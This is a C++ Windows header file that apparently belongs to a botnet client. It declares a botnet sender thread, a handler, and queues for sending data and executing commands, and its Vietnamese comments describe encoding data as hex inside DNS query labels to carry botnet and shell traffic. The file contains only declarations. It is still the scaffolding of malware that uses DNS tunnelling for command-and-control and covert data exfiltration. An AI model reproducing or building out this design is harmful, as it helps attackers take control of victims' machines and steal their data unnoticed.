#pragma once
#include <string>
#include <windows.h>
#include <queue>
#include <mutex>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

DWORD WINAPI senderBotnetThread(LPVOID lpParam);
DWORD handle_botnet(LPVOID lpParam);
void EnqueueSend(const std::string& s);
void EnqueueExecute(const std::string& s);


inline std::queue<std::string> send_queue;
inline std::mutex queue_mutex;
inline std::queue<std::string> execute_queue;
inline std::mutex execute_mutex;
inline bool should_stop_sender = false;
inline int botnet_packetNumber = 0;  // Separate packet counter for botnet/shell
// Giam max_len de tranh vuot gioi han do dai DNS query
// DNS label max = 63, total max = 253
// Format: c.packetNum.offset.id.HEXDATA.domain
// Du tru ~20 cho prefix, ~15 cho domain = ~38 chars cho hex
// 38 hex chars = 19 bytes du lieu goc
constexpr int max_len = 30; // Giam tu 60 de tranh gioi han DNS
